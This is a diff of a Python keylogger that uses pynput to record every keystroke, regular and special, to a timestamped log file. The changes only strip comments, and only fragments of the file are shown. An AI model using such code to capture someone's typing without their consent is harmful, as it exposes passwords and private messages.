@@ -1,6 +1,3 @@
-# keylogger.py
-
-# This file contains the core logic for capturing and logging keystrokes.
 
 from pynput import keyboard
 import logging
@@ -15,7 +12,6 @@ class KeyLogger:
         """
         Initializes the KeyLogger, setting up the logging configuration.
         """
-        # Set up logging to write to the specified file
         # The format includes timestamp, log level, and the message
         logging.basicConfig(filename=LOG_FILE, level=logging.INFO,
                             format='%(asctime)s: %(message)s')
@@ -30,7 +26,6 @@ class KeyLogger:
             # Log the alphanumeric key pressed
             self.logger.info(f"Key pressed: {key.char}")
         except AttributeError:
-            # Log special keys (e.g., Space, Enter, Shift)
             # Convert the key to a string for logging
             self.logger.info(f"Special key pressed: {str(key)}")
 
@@ -50,9 +45,6 @@ class KeyLogger:
         """
         Starts the keyboard listener.
         """
-        # Create a listener for keyboard events
-        # It calls _on_press when a key is pressed and _on_release when a key is released
         with keyboard.Listener(on_press=self._on_press, on_release=self._on_release) as listener:
             # Join the listener thread to the main thread
-            # This keeps the script running until the listener is stopped (e.g., by pressing 'esc')
             listener.join()
